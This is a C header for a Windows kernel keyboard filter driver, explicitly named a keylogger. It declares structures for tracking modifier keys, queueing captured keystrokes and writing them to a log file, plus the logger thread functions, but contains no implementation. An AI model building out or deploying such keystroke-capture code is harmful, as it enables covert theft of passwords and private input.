
#include <ntddk.h>
#include <wdf.h>
#include <Wdm.h>
#include "kbdmou.h"
#include <ntddkbd.h>
#include <ntdd8042.h>
#pragma comment(lib, "NtosKrnl.lib")
#pragma comment(lib, "Ntdll.lib")

#pragma warning(disable:4201)
#pragma warning(default:4201)

#ifndef __cplusplus
typedef unsigned char bool;
static const bool False = 0;
static const bool True = 1;
#endif

typedef struct _KEY_STATE
{
	bool kSHIFT; 
	bool kCAPSLOCK; 
	bool kCTRL; 
	bool kALT; 
} KEY_STATE, *PKEY_STATE;


typedef struct _KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
} KEY_DATA, *PKEY_DATA;

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; 
	PETHREAD pThreadObj;			
	bool bThreadTerminate;		   
	HANDLE hLogFile;				
	KEY_STATE kState;				
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

VOID
ConvertScanCodeToKeyCode(
	_In_ PDEVICE_EXTENSION pDevExt,
	_In_ KEY_DATA* kData,
	_In_ char* keys
);

#ifndef __KbdLog_h__
#define __KbdLog_h__


VOID ThreadKeyLogger(_In_ PVOID pContext);
NTSTATUS InitThreadKeyLogger(_In_  PDRIVER_OBJECT pDriverObject);

#endif

DEFINE_GUID(GUID_DEVINTERFACE_abs,
	0x53a16c7d, 0x6a24, 0x4ad4, 0xa3, 0xb6, 0xde, 0x00, 0x31, 0x6f, 0x18, 0xde);